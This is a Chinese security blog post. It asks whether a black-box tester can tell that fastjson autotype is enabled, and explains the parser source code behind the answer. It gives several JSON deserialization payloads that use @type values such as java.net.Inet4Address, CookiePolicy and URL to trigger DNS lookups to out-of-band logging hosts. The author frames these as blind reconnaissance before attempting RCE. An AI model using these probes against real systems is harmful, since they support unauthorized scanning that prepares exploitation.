#  黑盒能判断fastjson开启autotype了吗

原创 conman  [ conman ](javascript:void\(0\);)

**conman** ![]()

微信号 gh_1ccd784c4992

功能介绍 分享信息安全相关的知识

____

___发表于_

收录于合集

#web安全 14 个

#反序列化 2 个

#网络安全 18 个

tldr 能。  
当然，还是有条件的，本实验是在可以出网的环境测试的。fastjson版本1.2.77_preview_01。

## payload

方式一

    
    
    payload1:  
    { {"@type":"java.net.URL","val":"http://dns1.log.tld"}:"a"}  
    

如果收到dns1的请求，说明没有开启autotype。（本文未分析，因为写完了才发现。留给读者分析。）

方式二

    
    
    payload1:  
    {"@type":"java.net.Inet4Address","val":"dns1.log.tld"}  
    payload2  
    [{"@type":"java.net.CookiePolicy"},{"@type":"java.net.Inet4Address","val":"dns2.log.tld"}]  
    

发送2个请求，如果同时收到dns1和dns2的请求，说明开启了autotype。

## 起因

盲打fastjson时，发现payload1成功了。接下来就是payload一把梭，结果，并没有收到rmi/ldap请求。  
那么，问题来了。为什么没有成功？被拦截了，或者payload没有执行成功。因为执行需要各种条件。比如没有利用链的jar包，或者版本比较新，利用在黑名单或者没有开启autotype。一顿盲打，就是看运气有没有不在黑名单中的利用或者可以绕过autotype
check的利用，但是也许autotype就没有开启，这样再多的盲打也是徒劳。所有本文探讨一下，黑盒能否判断autotype开启了。

## 原理

payload原理比较简单。发送payload1是为了判断是否能出网。发送payload2，如果开启了autotype，则`{"@type":"java.net.CookiePolicy"}`
不会报错，后面的代码也会执行，这样就可以收到dns2；如果没有开启autotype，则前半句就会报错，后半句自然就不会执行，也就无法收到dns2请求。

## 分析

接下来，分析一下payload。  
不管是否开启autotype，payload1都可以执行成功。因为ParserConfig.java的1419行`clazz =
deserializers.findClass(typeName);`会取到java.net.Inet4Address，或者可以说java.net.Inet4Address是在某种“白”名单中。可以查看462行`
deserializers.put(Inet4Address.class, MiscCodec.instance);`
，这里给deserializers添加了Inet4Address。再查看MiscCodec.java第334和336行，我们就可以看到`InetAddress.getByName(strVal);`
做了dns解析，所以我们收到了dns请求。

再看ParserConfig.java。假设一个typename不在黑名单中，也不在白名单中，顺利通过了前面的检查，最终在1528行` if
(!autoTypeSupport)
{`会进行autotype判断，如果没有开启，就会报异常，测试payload就是根据这里做的判断。测试时发现，在开启autotype时，有些类会执行1524行的异常代码，所以还需要1523行`beanInfo.creatorConstructor`为null。只要满足这个条件即可。这样就会顺利执行后面的代码。就可以判断成功。

## 其它

java.net.URL

    
    
    payload3  
    {"@type":"java.net.URL","val":"http://dns3.log.tld"}  
    payload4  
    { {"@type":"java.net.URL","val":"http://dns4.log.tld"}:"a"}  
    

实际发现payload3可以收不到dns请求，payload4却可以。因为map操作时，调用了`java.net.URL`的hashcode函数，最终调用了`java.net.URLStreamHandler`的hashcode函数，调用了getHostAddress函数。

## 总结

问题想复杂了。

### 引用

  1. Fastjson 1.2.25-1.2.47反序列化漏洞分析

  2. fastjson blacklist

  3. FastJson 反序列化学习

  4. Fastjson 流程分析及 RCE 分析

  5. Java安全之Fastjson反序列化漏洞分析

  6. Fastjson 反序列化漏洞史

  7. 某json <= 1.2.68 远程代码执行漏洞分析

  

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

